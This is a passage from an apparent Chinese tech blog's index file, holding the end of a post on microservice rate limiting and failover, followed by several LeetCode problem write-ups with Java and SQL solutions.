<h3 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h3><p>通过原子变量计算单位时间内的访问次数，如果超过某个阈值，则拒绝后续的请求，等到下一个单位时间再重新计数。</p>
<h3 id="令牌筒"><a href="#令牌筒" class="headerlink" title="令牌筒"></a>令牌筒</h3><p>令牌筒是一个流行的实现限流的技术方案，它通过一个线程在单位时间内产生固定数量的令牌，然后把令牌放入队列，每次请求调用需从桶中拿取一个令牌，拿到令牌后才有资格执行请求调用，否则只能等待拿到令牌再执行，或者直接丢弃。</p>
<h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><h2 id="失效转移模式"><a href="#失效转移模式" class="headerlink" title="失效转移模式"></a>失效转移模式</h2><p>若微服务架构发生了熔断和限流，则该如何处理被拒绝的请求呢？解决这个问题的模式叫做失效转移模式，通常分为下面几种：</p>
<ul>
<li>采用快速失败的策略，直接返回使用方错误，让使用方知道发生了问题并自行决定后续处理</li>
<li>是否有备份服务，如果有备份服务，则迅速切换到备份服务</li>
<li>失败的服务有可能是某台机器有问题，采用重试的方法解决，但是这种方法要求服务提供者的服务实现了幂等性</li>
</ul>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>微服务</tag>
        <tag>架构</tag>
        <tag>容错</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux/Linux的N种IO模型</title>
    <url>/2020/04/10/Linux/Linux%E7%9A%84N%E7%A7%8DIO%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>1064. 不动点</title>
    <url>/2020/04/10/LeetCode/leetcode-001064.%20%E4%B8%8D%E5%8A%A8%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定已经按升序排列、由不同整数组成的数组 <code>A</code>，返回满足 <code>A[i] == i</code> 的最小索引 <code>i</code>。如果不存在这样的 <code>i</code>，返回 <code>-1</code>。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-10,-5,0,3,7]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">对于给定的数组，A[0] &#x3D; -10，A[1] &#x3D; -5，A[2] &#x3D; 0，A[3] &#x3D; 3，因此输出为 3 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">17</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">示例：</span><br><span class="line">A[<span class="number">0</span>] = <span class="number">0</span>，因此输出为 <span class="number">0</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-10,-5,3,4,7,9]</span><br><span class="line">输出：-1</span><br><span class="line">解释： </span><br><span class="line">不存在这样的 i 满足 A[i] &#x3D; i，因此输出为 -1 。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= A.length &lt; 10^4</code></li>
<li><code>-10^9 &lt;= A[i] &lt;= 10^9</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fixedPoint</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] == i) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>二分查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fixedPoint</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = A.length;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (A[mid] == mid) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[mid] &lt; mid) &#123;</span><br><span class="line">                <span class="comment">//元素值小于索引值，增大left</span></span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[mid] &gt; mid) &#123;</span><br><span class="line">                <span class="comment">//元素值大于索引值，减小right</span></span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (left == A.length) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> left == A[left] ? left : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>293. 翻转游戏</title>
    <url>/2020/04/10/LeetCode/leetcode-000293.%20%E7%BF%BB%E8%BD%AC%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你和朋友玩一个叫做「翻转游戏」的游戏，游戏规则：给定一个只有 + 和 - 的字符串。你和朋友轮流将 连续 的两个 “++” 反转成 “–”。 当一方无法进行有效的翻转时便意味着游戏结束，则另一方获胜。</p>
<p>请你写出一个函数，来计算出每个有效操作后，字符串所有的可能状态</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;++++&quot;</span><br><span class="line">输出: </span><br><span class="line">[</span><br><span class="line">  &quot;--++&quot;,</span><br><span class="line">  &quot;+--+&quot;,</span><br><span class="line">  &quot;++--&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>如果不存在可能的有效操作，请返回一个空列表 <code>[]</code>。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历，翻转</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">generatePossibleNextMoves</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; chars.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[i] == <span class="string">'+'</span> &amp;&amp; chars[i + <span class="number">1</span>] == <span class="string">'+'</span>) &#123;</span><br><span class="line">                chars[i] = <span class="string">'-'</span>;</span><br><span class="line">                chars[i + <span class="number">1</span>] = <span class="string">'-'</span>;</span><br><span class="line">                result.add(<span class="keyword">new</span> String(chars));</span><br><span class="line">                chars[i] = <span class="string">'+'</span>;</span><br><span class="line">                chars[i + <span class="number">1</span>] = <span class="string">'+'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>577. 员工奖金</title>
    <url>/2020/04/10/LeetCode/leetcode-000577.%20%E5%91%98%E5%B7%A5%E5%A5%96%E9%87%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>选出所有 bonus &lt; 1000 的员工的 name 及其 bonus。</p>
<p><code>Employee</code> 表单</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------+--------+-----------+--------+</span><br><span class="line">| empId |  name  | supervisor| salary |</span><br><span class="line">+-------+--------+-----------+--------+</span><br><span class="line">|   1   | John   |  3        | 1000   |</span><br><span class="line">|   2   | Dan    |  3        | 2000   |</span><br><span class="line">|   3   | Brad   |  null     | 4000   |</span><br><span class="line">|   4   | Thomas |  3        | 4000   |</span><br><span class="line">+-------+--------+-----------+--------+</span><br><span class="line">empId 是这张表单的主关键字</span><br><span class="line"></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;employee-bonus</span><br><span class="line">著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>

<p><code>Bonus</code> 表单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+-------+-------+</span><br><span class="line">| empId | bonus |</span><br><span class="line">+-------+-------+</span><br><span class="line">| <span class="number">2</span>     | <span class="number">500</span>   |</span><br><span class="line">| <span class="number">4</span>     | <span class="number">2000</span>  |</span><br><span class="line">+-------+-------+</span><br><span class="line">empId 是这张表单的主关键字</span><br></pre></td></tr></table></figure>

<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------+-------+</span><br><span class="line">| name  | bonus |</span><br><span class="line">+-------+-------+</span><br><span class="line">| John  | null  |</span><br><span class="line">| Dan   | 500   |</span><br><span class="line">| Brad  | null  |</span><br><span class="line">+-------+-------+</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>, bonus <span class="keyword">from</span> Bonus <span class="keyword">right</span> <span class="keyword">join</span> Employee <span class="keyword">on</span> Bonus.empId = Employee.empId <span class="keyword">where</span> bonus &lt; <span class="number">1000</span> <span class="keyword">or</span> bonus <span class="keyword">is</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>586. 订单最多的客户</title>
    <url>/2020/04/10/LeetCode/leetcode-000586-%E8%AE%A2%E5%8D%95%E6%9C%80%E5%A4%9A%E7%9A%84%E5%AE%A2%E6%88%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在表 orders 中找到订单数最多客户对应的 customer_number 。</p>
<p>数据保证订单数最多的顾客恰好只有一位。</p>
<p>表 orders 定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| Column            | Type      |</span><br><span class="line">|-------------------|-----------|</span><br><span class="line">| order_number (PK) | int       |</span><br><span class="line">| customer_number   | int       |</span><br><span class="line">| order_date        | date      |</span><br><span class="line">| required_date     | date      |</span><br><span class="line">| shipped_date      | date      |</span><br><span class="line">| status            | char(15)  |</span><br><span class="line">| comment           | char(200) |</span><br></pre></td></tr></table></figure>

<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| order_number | customer_number | order_date | required_date | shipped_date | status | comment |</span><br><span class="line">|--------------|-----------------|------------|---------------|--------------|--------|---------|</span><br><span class="line">| 1            | 1               | 2017-04-09 | 2017-04-13    | 2017-04-12   | Closed |         |</span><br><span class="line">| 2            | 2               | 2017-04-15 | 2017-04-20    | 2017-04-18   | Closed |         |</span><br><span class="line">| 3            | 3               | 2017-04-16 | 2017-04-25    | 2017-04-20   | Closed |         |</span><br><span class="line">| 4            | 3               | 2017-04-18 | 2017-04-28    | 2017-04-25   | Closed |         |</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">| customer_number |</span><br><span class="line">|-----------------|</span><br><span class="line">| 3               |</span><br><span class="line"></span><br><span class="line">customer_number 为 &#39;3&#39; 的顾客有两个订单，比顾客 &#39;1&#39; 或者 &#39;2&#39; 都要多，因为他们只有一个订单</span><br><span class="line">所以结果是该顾客的 customer_number ，也就是 3 。</span><br></pre></td></tr></table></figure>

<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶:"></a>进阶:</h2><p>如果有多位顾客订单数并列最多，你能找到他们所有的 customer_number 吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	customer_number</span><br><span class="line">FROM</span><br><span class="line">	orders</span><br><span class="line">GROUP BY customer_number</span><br><span class="line"><span class="function">ORDER BY <span class="title">COUNT</span><span class="params">(*)</span> DESC</span></span><br><span class="line"><span class="function">LIMIT 1</span></span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><h4 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">SELECT</span><br><span class="line">	customer_number</span><br><span class="line">FROM</span><br><span class="line">	orders o1</span><br><span class="line">GROUP BY o1.customer_number</span><br><span class="line">HAVING COUNT(*) &#x3D; (</span><br><span class="line">			SELECT</span><br><span class="line">				COUNT(*)</span><br><span class="line">			FROM</span><br><span class="line">				orders o2</span><br><span class="line">			GROUP BY o2. customer_number</span><br><span class="line">			ORDER BY COUNT(*) DESC</span><br><span class="line">			LIMIT 1</span><br><span class="line">	);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>511. 游戏玩法分析 I</title>
    <url>/2020/04/10/LeetCode/leetcode-000511.%20%E6%B8%B8%E6%88%8F%E7%8E%A9%E6%B3%95%E5%88%86%E6%9E%90%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>活动表 <code>Activity</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+---------+</span><br><span class="line">| Column Name  | Type    |</span><br><span class="line">+--------------+---------+</span><br><span class="line">| player_id    | int     |</span><br><span class="line">| device_id    | int     |</span><br><span class="line">| event_date   | date    |</span><br><span class="line">| games_played | int     |</span><br><span class="line">+--------------+---------+</span><br><span class="line">表的主键是 (player_id, event_date)。</span><br><span class="line">这张表展示了一些游戏玩家在游戏平台上的行为活动。</span><br><span class="line">每行数据记录了一名玩家在退出平台之前，当天使用同一台设备登录平台后打开的游戏的数目（可能是 0 个）。</span><br></pre></td></tr></table></figure>

<p>写一条 SQL 查询语句获取每位玩家 <strong>第一次登陆平台的日期</strong>。</p>
<p>查询结果的格式如下所示：</p>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Activity 表：</span><br><span class="line">+-----------+-----------+------------+--------------+</span><br><span class="line">| player_id | device_id | event_date | games_played |</span><br><span class="line">+-----------+-----------+------------+--------------+</span><br><span class="line">| <span class="number">1</span>         | <span class="number">2</span>         | <span class="number">2016</span>-<span class="number">03</span>-<span class="number">01</span> | <span class="number">5</span>            |</span><br><span class="line">| <span class="number">1</span>         | <span class="number">2</span>         | <span class="number">2016</span>-<span class="number">05</span>-<span class="number">02</span> | <span class="number">6</span>            |</span><br><span class="line">| <span class="number">2</span>         | <span class="number">3</span>         | <span class="number">2017</span>-<span class="number">06</span>-<span class="number">25</span> | <span class="number">1</span>            |</span><br><span class="line">| <span class="number">3</span>         | <span class="number">1</span>         | <span class="number">2016</span>-<span class="number">03</span>-<span class="number">02</span> | <span class="number">0</span>            |</span><br><span class="line">| <span class="number">3</span>         | <span class="number">4</span>         | <span class="number">2018</span>-<span class="number">07</span>-<span class="number">03</span> | <span class="number">5</span>            |</span><br><span class="line">+-----------+-----------+------------+--------------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+-----------+-------------+</span><br><span class="line">| player_id | first_login |</span><br><span class="line">+-----------+-------------+</span><br><span class="line">| <span class="number">1</span>         | <span class="number">2016</span>-<span class="number">03</span>-<span class="number">01</span>  |</span><br><span class="line">| <span class="number">2</span>         | <span class="number">2017</span>-<span class="number">06</span>-<span class="number">25</span>  |</span><br><span class="line">| <span class="number">3</span>         | <span class="number">2016</span>-<span class="number">03</span>-<span class="number">02</span>  |</span><br><span class="line">+-----------+-------------+</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> player_id ,<span class="keyword">min</span>(event_date) <span class="keyword">as</span> first_login <span class="keyword">from</span> Activity <span class="keyword">group</span> <span class="keyword">by</span> player_id;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>700. 二叉搜索树中的搜索</title>
    <url>/2020/04/10/LeetCode/leetcode-000700.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定二叉搜索树（BST）的根节点和一个值。 你需要在BST中找到节点值等于给定值的节点。 返回以该节点为根的子树。 如果节点不存在，则返回 NULL。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定二叉搜索树:</span><br><span class="line"></span><br><span class="line">        4</span><br><span class="line">       &#x2F; \</span><br><span class="line">      2   7</span><br><span class="line">     &#x2F; \</span><br><span class="line">    1   3</span><br><span class="line"></span><br><span class="line">和值: 2</span><br><span class="line"></span><br><span class="line">你应该返回如下子树:</span><br><span class="line"></span><br><span class="line">      2     </span><br><span class="line">     &#x2F; \   </span><br><span class="line">    1   3</span><br></pre></td></tr></table></figure>

<p>在上述示例中，如果要找的值是 <code>5</code>，但因为没有节点值为 <code>5</code>，我们应该返回 <code>NULL</code>。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归搜索</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">searchBST</span><span class="params">(TreeNode root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root.val == val) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root.val &gt; val) &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.left, val);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.right, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>迭代搜索</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">searchBST</span><span class="params">(TreeNode root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span> || root.val == val) <span class="keyword">return</span> root;</span><br><span class="line">        root = root.val &gt; val ? root.left : root.right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
        <tag>迭代</tag>
      </tags>
  </entry>
  <entry>
    <title>933. 最近的请求次数</title>
    <url>/2020/04/10/LeetCode/leetcode-000933.%20%E6%9C%80%E8%BF%91%E7%9A%84%E8%AF%B7%E6%B1%82%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>写一个 RecentCounter 类来计算最近的请求。</p>
<p>它只有一个方法：ping(int t)，其中 t 代表以毫秒为单位的某个时间。</p>
<p>返回从 3000 毫秒前到现在的 ping 数。</p>
<p>任何处于 [t - 3000, t] 时间范围之内的 ping 都将会被计算在内，包括当前（指 t 时刻）的 ping。</p>
<p>保证每次对 ping 的调用都使用比之前更大的 t 值</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：inputs &#x3D; [&quot;RecentCounter&quot;,&quot;ping&quot;,&quot;ping&quot;,&quot;ping&quot;,&quot;ping&quot;], inputs &#x3D; [[],[1],[100],[3001],[3002]]</span><br><span class="line">输出：[null,1,2,3,3]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>每个测试用例最多调用 10000 次 ping。</li>
<li>每个测试用例会使用严格递增的 t 值来调用 ping。</li>
<li>每次调用 ping 都有 1 &lt;= t &lt;= 10^9。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RecentCounter</span> </span>&#123;</span><br><span class="line">	List&lt;Integer&gt; list;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RecentCounter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">    	list.add(t);</span><br><span class="line">    	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="keyword">int</span> i = list.size() - <span class="number">1</span>;i&gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">    		<span class="keyword">if</span> (t - list.get(i) &lt;= <span class="number">3000</span>) &#123;</span><br><span class="line">    			count++;</span><br><span class="line">    		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>我们只会考虑最近 3000 毫秒到现在的 ping 数，因此我们可以使用队列存储这些 ping 的记录。当收到一个时间 t 的 ping 时，我们将它加入队列，并且将所有在时间 t - 3000 之前的 ping 移出队列。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RecentCounter</span> </span>&#123;</span><br><span class="line">    Queue&lt;Integer&gt; q;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RecentCounter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">        q.add(t);</span><br><span class="line">        <span class="keyword">while</span> (q.peek() &lt; t - <span class="number">3000</span>)</span><br><span class="line">            q.poll();</span><br><span class="line">        <span class="keyword">return</span> q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>设计</tag>
      </tags>
  </entry>
  <entry>
    <title>942. 增减字符串匹配</title>
    <url>/2020/04/10/LeetCode/leetcode-000942.%20%E5%A2%9E%E5%87%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定只含 “I”（增大）或 “D”（减小）的字符串 S ，令 N = S.length。</p>
<p>返回 [0, 1, …, N] 的任意排列 A 使得对于所有 i = 0, …, N-1，都有：</p>
<pre><code>如果 S[i] == &quot;I&quot;，那么 A[i] &lt; A[i+1]
如果 S[i] == &quot;D&quot;，那么 A[i] &gt; A[i+1]</code></pre><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出：&quot;IDID&quot;</span><br><span class="line">输出：[0,4,1,3,2]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输出：<span class="string">"DDI"</span></span><br><span class="line">输出：[<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出：&quot;III&quot;</span><br><span class="line">输出：[0,1,2,3]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= S.length &lt;= 10000</code></li>
<li><code>S</code> 只包含字符 <code>&quot;I&quot;</code> 或 <code>&quot;D&quot;</code>。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>双指针。begin和end指向一头一尾。每次碰到I，就把begin赋值给当前结果数组，然后自增1；遇到D就把end赋值给当前结果数据，然后自减1</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] diStringMatch(String S) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[S.length() + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = S.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S.length();i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'I'</span> == S.charAt(i)) &#123;</span><br><span class="line">                result[index++] = begin++;</span><br><span class="line">            &#125; <span 